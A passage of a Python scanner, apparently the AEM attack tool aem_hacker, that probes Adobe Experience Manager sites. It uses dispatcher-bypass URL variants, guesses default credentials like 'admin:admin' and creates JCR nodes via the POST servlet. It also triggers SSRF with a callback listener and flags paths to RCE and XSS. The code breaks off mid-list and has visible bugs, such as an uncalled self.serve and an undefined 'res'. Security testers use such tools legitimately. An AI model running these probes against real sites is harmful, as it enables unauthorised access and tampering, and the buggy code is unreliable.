import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread

import requests

requests.packages.urllib3.disable_warnings()


CREDS = ('admin:admin', 'author:author', 'replication-receiver:replication-receiver', 'vgnadmin:vgnadmin', 'aparker@geometrixx.info:aparker', 'jdoe@geometrixx.info:jdoe')


def random_string(len=10):
    return ''.join([choice(ascii_letters) for _ in range(len)])


registered = []  # Registered checks
token = random_string()  # Token to recognize SSRF was triggered
d = {}  # store SSRF detections


class Detector(BaseHTTPRequestHandler):
    def __init__(self, token, d, *args):
        self.d = d
        self.token = token
        BaseHTTPRequestHandler.__init__(self, *args)

    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.serve()

    def do_POST(self):
        self.serve()

    def do_PUT(self):
        self.serve

    def serve(self):
        try:
            token, key, value = self.path.split('/')[1:4]
        except:
            self.send_response(200)
            return

        if self.token != token:
            self.send_response(200)
            return

        if key in self.d:
            self.d[key].append(value)
        else:
            self.d[key] = [value, ]

        self.send_response(200)


def register(f):
    registered.append(f)

    return f


Finding = namedtuple('Finding', 'name, url, description')


def normalize_url(base_url, path):
    if base_url[-1] == '/' and (path[0] == '/' or path[0] == '\\'):
        url = base_url[:-1] + path
    else:
        url = base_url + path

    return url


def content_type(ct):
    return ct.split(';')[0].lower().strip()


def error(message, **kwargs):
    print('[{}] {}'.format(datetime.datetime.now().time(), message), sys.stderr)
    for n, a in kwargs.items():
        print('\t{}={}'.format(n, a), sys.stderr)

    exc_type, exc_value, exc_traceback = sys.exc_info()
    print('Exception type:' + str(exc_type), sys.stderr)
    print('Exception value:' + str(exc_value), sys.stderr)
    print('TRACE:', sys.stderr)
    traceback.print_tb(exc_traceback, file=sys.stderr)
    print('\n\n\n', sys.stderr)


def http_request(url, method='GET', data=None, additional_headers=None, proxy=None):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'}
    if additional_headers:
        headers.update(additional_headers)

    if not proxy:
        proxy = {}

    resp = requests.request(method, url, data=data, headers=headers, proxies=proxy, verify=False, timeout=40, allow_redirects=False)

    return resp


def http_request_multipart(url, method='POST', data=None, additional_headers=None, proxy=None):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'}
    if additional_headers:
        headers.update(additional_headers)

    if not proxy:
        proxy = {}

    resp = requests.request(method, url, files=data, headers=headers, proxies=proxy, verify=False, timeout=40, allow_redirects=False)

    return resp


def preflight(url, proxy=None):
    try:
        http_request(url, proxy=proxy)
    except:
        return False
    else:
        return True


@register
def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
    GETSERVLET = itertools.product(('/etc', '/var', '/apps', '/home', '///etc', '///var', '///apps', '///home'),
                                   ('.json', '.1.json', '.4.2.1....json', '.json/a.css', '.json.html', '.json.css',
                                    '.json/a.html', '.json/a.png', '.json/a.ico', '.json/b.jpeg', '.json/b.gif',
                                    '.json;%0aa.css', '.json;%0aa.png', '.json;%0aa.html', '.json;%0aa.js', '.json/a.js'))
    GETSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in GETSERVLET)

    results = []

    for path in GETSERVLET:
        url = normalize_url(base_url, path)

        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())['jcr:primaryType']
                except:
                    pass
                else:
                    f = Finding('DefaultGetServlet', url,
                                'Sensitive information might be exposed via AEM\'s DefaultGetServlet. '
                                'Check child nodes manually for secrets exposed, see - '
                                'https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=43')

                    results.append(f)
        except:
            if debug:
                error('Exception while performing a check', check='exposed_get_servlet', url=url)

    return results


@register
def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
    QUERYBUILDER = itertools.product(('/bin/querybuilder.json', '/bin/querybuilder.json.servlet',
                                      '///bin///querybuilder.json', '///bin///querybuilder.json.servlet',
                                      '/bin/querybuilder.feed', '/bin/querybuilder.feed.servlet',
                                      '///bin///querybuilder.feed', '///bin///querybuilder.feed.servlet'),
                                     ('', '.css', '.ico', '.png', '.gif', '.jpeg', '.html', '.1.json', '.4.2.1...json',
                                      '/a.css', '/a.html', '/a.ico', '/a.png' '/a.js', '/a.1.json', '/a.4.2.1...json',
                                      ';%0aa.css', ';%0aa.png', ';%0aa.js', ';%0aa.html', ';%0aa.ico'))
    QUERYBUILDER = list('{0}{1}'.format(p1, p2) for p1, p2 in QUERYBUILDER)

    results = []
    found_json = False
    found_feed = False
    for path in QUERYBUILDER:
        if found_feed and found_json:
            break

        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())['hits']
                except:
                    pass
                else:
                    if found_json:
                        continue

                    f = Finding('QueryBuilderJsonServlet', url,
                                'Sensitive information might be exposed via AEM\'s QueryBuilderJsonServlet. '
                                'See - https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/querybuilder-predicate-reference.html')

                    results.append(f)
                    found_json = True

                if '</feed>' in str(resp.content):
                    if found_feed:
                        continue

                    f = Finding('QueryBuilderFeedServlet', url,
                                'Sensitive information might be exposed via AEM\'s QueryBuilderFeedServlet. '
                                'See - https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/querybuilder-predicate-reference.html')

                    results.append(f)
                    found_feed = True
        except:
            if debug:
                error('Exception while performing a check', check='exposed_querybuilder_servlet', url=url)

    return results


@register
def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
    GQLSERVLET = (
        '/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.1.json?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.4.2.1...json?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json;%0aa.html?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json;%0aa.js?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json;%0aa.png?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json;%0aa.ico?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.css?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.js?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.ico?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.png?query=type:base%20limit:..1&pathPrefix=',
        '/bin/wcm/search/gql.json/a.html?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.servlet.json?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.1.json?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.4.2.1...json?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json;%0aa.js?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json;%0aa.html?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json;%0aa.png?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json;%0aa.ico?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.css?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.ico?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.png?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.js?query=type:base%20limit:..1&pathPrefix=',
        '///bin///wcm///search///gql.json///a.html?query=type:base%20limit:..1&pathPrefix='
    )

    results = []
    for path in GQLSERVLET:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())['hits']
                except:
                    pass
                else:
                    f = Finding('GQLServlet', url,
                                'Sensitive information might be exposed via AEM\'s GQLServlet. '
                                'See - https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/reference-materials/javadoc/index.html?org/apache/jackrabbit/commons/query/GQL.html')

                    results.append(f)
                    break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_gql_servlet', url=url)

    return results


@register
def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
    POSTSERVLET = itertools.product(('/', '/content', '/content/dam'),
                                    ('.json', '.1.json', '.json/a.css', '.json/a.html', '.json/a.ico', '.json/a.png',
                                     '.json/a.gif', '.json/a.1.json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js',
                                     '.json;%0aa.png', '.json;%0aa.ico', '.4.2.1...json'))
    POSTSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in POSTSERVLET)

    results = []
    for path in POSTSERVLET:
        url = normalize_url(base_url, path)
        try:
            data = ':operation=nop'
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
            resp = http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)

            if resp.status_code == 200 and 'Null Operation Status:' in str(resp.content):
                # TODO: Matt will add more details on how to exploit
                f = Finding('POSTServlet', url,
                            'POSTServlet is exposed, persistent XSS or RCE might be possible, it depends on your privileges.')
                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_post_servlet', url=url)

    return results


@register
def create_new_nodes(base_url, my_host, debug=False, proxy=None):
    CREDS = ('admin:admin', 'author:author')

    POSTSERVLET = itertools.product(('/content/test', '/content/*', '/content/usergenerated/test', '/content/usergenerated/*',
                                     '/content/usergenerated/etc/commerce/smartlists/test', '/content/usergenerated/etc/commerce/smartlists/*',
                                     '/apps/test', '/apps/*'),
                                    ('.json', '.1.json', '.json/a.css', '.json/a.html', '.json/a.ico', '.json/a.png',
                                     '.json/a.gif', '.json/a.1.json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js',
                                     '.json;%0aa.png', '.json;%0aa.ico', '.4.2.1...json'))
    POSTSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in POSTSERVLET)

    results = []
    for path in POSTSERVLET:
        url = normalize_url(base_url, path)
        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy)

            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
                f = Finding('CreateJCRNodes', url,
                            'It\'s possible to create new JCR nodes using POST Servlet. As anonymous user. '
                            'You might get persistent XSS.')
                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='create_new_nodes', url=url)


    for path, creds in itertools.product(POSTSERVLET, CREDS):
        url = normalize_url(base_url, path)
        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url,
                       'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy)

            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
                f = Finding('CreateJCRNodes', url,
                            'It\'s possible to create new JCR nodes using POST Servlet as "{0}" user. '
                            'You might get persistent XSS or RCE.'.format(creds))
                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='create_new_nodes', url=url)

    return results


@register
def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
    LOGINSTATUS = itertools.product(('/system/sling/loginstatus', '///system///sling///loginstatus'),
                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json/a.1.json',
                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
                                     '.json;%0aa.ico', '.4.2.1...json'))
    LOGINSTATUS = list('{0}{1}'.format(p1, p2) for p1, p2 in LOGINSTATUS)

    results = []
    for path in LOGINSTATUS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and 'authenticated=' in str(resp.content):
                f = Finding('LoginStatusServlet', url,
                            'LoginStatusServlet is exposed, it allows to bruteforce credentials. '
                            'You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy, cq:LastModifiedBy attributes of any JCR node.')
                results.append(f)

                for creds in CREDS:
                    headers = {'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
                    resp = http_request(url, additional_headers=headers, proxy=proxy)

                    if 'authenticated=true' in str(resp.content):
                        f = Finding('AEM with default credentials', url,
                                    'AEM with default credentials "{0}".'.format(creds))
                        results.append(f)

                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_loginstatus_servlet', url=url)

    return results


@register
def exposed_currentuser_servlet(base_url, my_host, debug=False, proxy=None):
    CURRENTUSER = itertools.product(('/libs/granite/security/currentuser', '///libs///granite///security///currentuser'),
                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json?a.css', '.json/a.1.json',
                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
                                     '.json;%0aa.ico', '.4.2.1...json'))
    CURRENTUSER = list('{0}{1}'.format(p1, p2) for p1, p2 in CURRENTUSER)

    results = []
    for path in CURRENTUSER:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and 'authorizableId' in str(resp.content):
                f = Finding('CurrentUserServlet', url,
                    'CurrentUserServlet is exposed, it allows to bruteforce credentials. '
                    'You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy, cq:LastModifiedBy attributes of any JCR node.')
                results.append(f)

                for creds in CREDS:
                    headers = {'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
                    resp = http_request(url, additional_headers=headers, proxy=proxy)

                    if 'anonymous' not in str(resp.content):
                        f = Finding('AEM with default credentials', url,
                                    'AEM with default credentials "{0}".'.format(creds))
                        results.append(f)

                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_currentuser_servlet', url=url)

    return results


@register
def exposed_userinfo_servlet(base_url, my_host, debug=False, proxy=None):
    USERINFO = itertools.product(('/libs/cq/security/userinfo', '///libs///cq///security///userinfo'),
                                    ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json?a.css', '.json/a.1.json',
                                     '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
                                     '.json;%0aa.ico', '.4.2.1...json'))

    USERINFO = list('{0}{1}'.format(p1, p2) for p1, p2 in USERINFO)

    results = []
    for path in USERINFO:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and 'userID' in str(resp.content):
                f = Finding('UserInfoServlet', url,
                    'UserInfoServlet is exposed, it allows to bruteforce credentials. '
                    'You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy, cq:LastModifiedBy attributes of any JCR node.')
                results.append(f)

                for creds in CREDS:
                    headers = {'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
                    resp = http_request(url, additional_headers=headers, proxy=proxy)

                    if 'anonymous' not in str(resp.content):
                        f = Finding('AEM with default credentials', url,
                                    'AEM with default credentials "{0}".'.format(creds))
                        results.append(f)

                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_userinfo_servlet', url=url)

    return results
    

@register
def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
    FELIXCONSOLE = itertools.product(('/system/console/bundles', '///system///console///bundles'),
                                    ('', '.json', '.1.json', '.4.2.1...json', '.css', '.ico', '.png', '.gif', '.html', '.js',
                                     ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.png', '.json;%0aa.ico', '.servlet/a.css',
                                     '.servlet/a.js', '.servlet/a.html', '.servlet/a.ico', '.servlet/a.png'))
    FELIXCONSOLE = list('{0}{1}'.format(p1, p2) for p1, p2 in FELIXCONSOLE)

    results = []
    for path in FELIXCONSOLE:
        url = normalize_url(base_url, path)
        headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
        try:
            resp = http_request(url, additional_headers=headers, proxy=proxy)

            if resp.status_code == 200 and 'Web Console - Bundles' in str(resp.content):
                f = Finding('FelixConsole', url,
                            'Felix Console is exposed, you may get RCE by installing OSGI bundle. '
                            'See - https://github.com/0ang3el/aem-rce-bundle')
                results.append(f)

                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_felix_console', url=url)

    return results


@register
def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
    WCMDEBUG = itertools.product(('/', '/content', '/content/dam'),
                                 ('.json', '.1.json', '.json.html', '.json.css', '.json.js', '.4.2.1...json', '.json/a.css',
                                  '.json/a.html', '.json/a.png', '.json/a.ico', '.json/a.js', '.json/b.gif', '.json%0aa.css',
                                  '.json%0aa.html', '.json%0aa.png', '.json%0aa.ico'),
                                 ('?debug=layout',))
    WCMDEBUG = list('{0}{1}{2}'.format(p1, p2, p3) for p1, p2, p3 in WCMDEBUG)

    results = []
    for path in WCMDEBUG:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and 'res=' in str(resp.content) and 'sel=' in str(resp.content):
                f = Finding('WCMDebugFilter', url,
                            'WCMDebugFilter exposed and might be vulnerable to reflected XSS (CVE-2016-7882). '
                            'See - https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_wcmdebug_filter', url=url)

    return results


@register
def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
    WCMSUGGESTIONS = itertools.product(
        ('/bin/wcm/contentfinder/connector/suggestions', '///bin///wcm///contentfinder///connector///suggestions'),
        ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css', '.json/a.css',
         '.json/a.png', '.json/a.html', '.4.2.1...json'),
        ('?query_term=path%3a/&pre=<1337abcdef>&post=yyyy',)
    )
    WCMSUGGESTIONS = list('{0}{1}{2}'.format(p1, p2, p3) for p1, p2, p3 in WCMSUGGESTIONS)

    results = []
    for path in WCMSUGGESTIONS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and '<1337abcdef>' in str(resp.content):
                f = Finding('WCMSuggestionsServlet', url,
                            'WCMSuggestionsServlet exposed and might result in reflected XSS. '
                            'See - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=96')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_wcmsuggestions_servlet', url=url)

    return results


@register
def exposed_auditlog_servlet(base_url, my_host, debug=False, proxy=None):
    AUDITLOG = itertools.product(('/bin/msm/audit', '///bin///msm///audit'),
                                 ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css',
                                  '.4.2.1...json', '.json/a.css', '.json/a.html', '.json/a.png', '.json;%0aa.html'))
    AUDITLOG = list('{0}{1}'.format(p1, p2) for p1, p2 in AUDITLOG)

    results = []
    for path in AUDITLOG:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    count = int(json.loads(resp.content.decode())['results'])
                except:
                    pass
                else:
                    if count != 0:
                        f = Finding('AuditLogServlet', url,
                                    'AuditLogServlet is vulnerable and exposing audit log records.')

                        results.append(f)
                        break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_auditlog_servlet', url=url)

    return results


@register
def exposed_crxde_logs(base_url, my_host, debug=False, proxy=None):
    CRXDELOGS = itertools.product(
        ('/bin/crxde/logs{0}?tail=100', '///bin///crxde///logs{0}?tail=100'),
        ('', '.json', '.1.json', '.4.2.1...json', '.html', ';%0aa.css', ';%0aa.html', ';%0aa.js',
         ';%0aa.ico', ';%0aa.png', '/a.css', '/a.html', '/a.png', '/a.js', '/a.ico')
    )
    CRXDELOGS = list(p1.format(p2) for p1, p2 in CRXDELOGS)

    results = []
    for path in CRXDELOGS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and ('*WARN*' in str(resp.content) or '*INFO*' in str(resp.content)):

                f = Finding('CRXDE logs', url, 'CRXDE logs are exposed.')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_crxde_logs', url=url)

    return results


@register
def exposed_crxde_crx(base_url, my_host, debug=False, proxy=None):
    CRXDELITE = itertools.product(
        ('/crx/de/index.jsp', '///crx///de///index.jsp'),
        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
    )
    CRXDELITE = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXDELITE)

    CRX = itertools.product(
        ('/crx/explorer/browser/index.jsp', '///crx///explorer///browser///index.jsp'),
        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
    )
    CRX = list('{0}{1}'.format(p1, p2) for p1, p2 in CRX)

    CRXSEARCH = itertools.product(
        ('/crx/explorer/ui/search.jsp', '/crx///explorer///ui///search.jsp'),
        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
    )
    CRXSEARCH = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXSEARCH)

    CRXNAMESPACE = itertools.product(
        ('/crx/explorer/ui/namespace_editor.jsp', '///crx/explorer///ui///namespace_editor.jsp'),
        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
    )
    CRXNAMESPACE = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXNAMESPACE)


    PACKMGR = itertools.product(
        ('/crx/packmgr/index.jsp', '///crx///packmgr///index.jsp'),
        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
    )
    PACKMGR = list('{0}{1}'.format(p1, p2) for p1, p2 in PACKMGR)

    results = []
    for path in itertools.chain(CRXDELITE, CRX, CRXSEARCH, CRXNAMESPACE, PACKMGR):
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and ('CRXDE Lite' in str(resp.content) or 'Content Explorer' in str(resp.content) or
                                            'CRX Package Manager' in str(resp.content) or 'Search for:' in str(res.content) or
                                            'Namespace URI' in str(resp.content)) :
                f = Finding('CRXDE Lite/CRX', url, 'Sensitive information might be exposed. Check manually.')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_crxde_crx', url=url)

    return results


@register
def exposed_reports(base_url, my_host, debug=False, proxy=None):
    DISKUSAGE = itertools.product(
        ('/etc/reports/diskusage.html', '///etc/reports///diskusage.html'),
        ('')
    )
    DISKUSAGE = list('{0}{1}'.format(p1,p2) for p1, p2 in DISKUSAGE)

    results = []
    for path in DISKUSAGE:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and ('Disk Usage' in str(resp.content)):

                f = Finding('Disk Usage report', url, 'Disk Usage report are exposed.')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_reports', url=url)

    return results


@register
def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    SALESFORCESERVLET1 = itertools.product(
        (
            '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
            '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
        ),
        (
            '.json', '.1.json', '.4.2.1...json', '.html'
        )
    )
    SALESFORCESERVLET1 = list(pair[0].format(pair[1]) for pair in SALESFORCESERVLET1)

    SALESFORCESERVLET2 = itertools.product(
        (
            '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
            '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
        ),
        (
           '.html/{0}.1.json', '.html/{0}.4.2.1...json', '.html/{0}.css', '.html/{0}.js', '.html/{0}.png', '.html/{0}.bmp',
           '.html;%0a{0}.css', '.html;%0a{0}.js', '.json;%0a{0}.css', '.html;%0a{0}.png', '.json;%0a{0}.png',
           '.json;%0a{0}.html', '.json/{0}.css', '.json/{0}.js', '.json/{0}.png', '.json/a.gif', '.json/{0}.ico', '.json/{0}.html'
        )
    )
    cache_buster = random_string()
    SALESFORCESERVLET2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET2)

    SALESFORCESERVLET3 = itertools.product(
        (
            '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
            '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
            '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
        ),
        (
            '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
        )
    )
    cache_buster = randint(1, 2**12)
    SALESFORCESERVLET3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET3)

    for path in itertools.chain(SALESFORCESERVLET1, SALESFORCESERVLET2, SALESFORCESERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = 'http://{0}/{1}/salesforcesecret/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_salesforcesecret_servlet', url=url)

    time.sleep(10)

    if 'salesforcesecret' in d:
        u = base64.b16decode(d.get('salesforcesecret')[0]).decode()
        f = Finding('SalesforceSecretServlet', u,
                    'SSRF via SalesforceSecretServlet (CVE-2018-5006) was detected. '
                    'See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html')

        results.append(f)

    return results


@register
def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d

    results = []

    REPOSTINGSERVICESSERVLET1 = (
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.json?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/content/proxy.reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
        '///libs///cq///contentinsight///proxy///reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a'
    )

    REPOSTINGSERVICESSERVLET2 = (
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
        '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
